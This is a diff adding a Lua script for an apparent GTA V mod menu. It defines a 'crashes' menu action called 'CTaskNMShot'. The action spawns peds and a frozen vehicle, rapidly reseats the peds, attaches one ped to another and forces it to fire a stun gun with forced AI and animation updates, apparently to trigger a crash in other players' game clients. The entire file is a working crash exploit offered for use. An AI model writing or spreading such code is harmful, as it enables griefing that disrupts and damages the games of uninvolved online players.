@@ -1,0 +1,37 @@
+util.require_natives("2944a", "g-uno")
+
+local crashes = menu.my_root()
+
+crashes:action("CTaskNMShot", {""}, "", function(bool)
+    local pid = players.user()
+
+    local pos = players.get_position(pid)
+    local ped1 = CREATE_RANDOM_PED(pos)
+    local ped2 = CREATE_RANDOM_PED(pos)
+    local ped3 = CREATE_RANDOM_PED(pos)
+    util.request_model(util.joaat("adder"))
+    local veh = entities.create_vehicle(util.joaat("adder"), pos, 0)
+    FREEZE_ENTITY_POSITION(veh, true)
+    local peds = {ped1, ped2}
+    repeat
+        SET_PED_INTO_VEHICLE(ped1, veh, 0)
+        SET_PED_INTO_VEHICLE(ped3, veh, -1)
+        util.yield()
+    until GET_PED_IN_VEHICLE_SEAT(veh, 0) == ped1
+
+    SET_PED_INTO_VEHICLE(ped1, veh, -1)
+    ATTACH_ENTITY_TO_ENTITY(ped2, ped1, 0, 0, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, true, false, 0, false)
+    SET_ENTITY_HEADING(ped2, GET_ENTITY_COORDS(ped3))
+    GIVE_WEAPON_TO_PED(ped2, util.joaat("weapon_stungun_mp"), 9999, true, true)
+    TASK_SHOOT_AT_ENTITY(ped2, ped3, 5000, 0)
+    
+    while GET_PED_IN_VEHICLE_SEAT(veh, -1) == ped3 do
+        FORCE_PED_AI_AND_ANIMATION_UPDATE(ped2)
+        REFILL_AMMO_INSTANTLY(ped2)
+        util.yield()
+    end
+
+    for peds as ped do
+        entities.delete(ped)
+    end
+end)
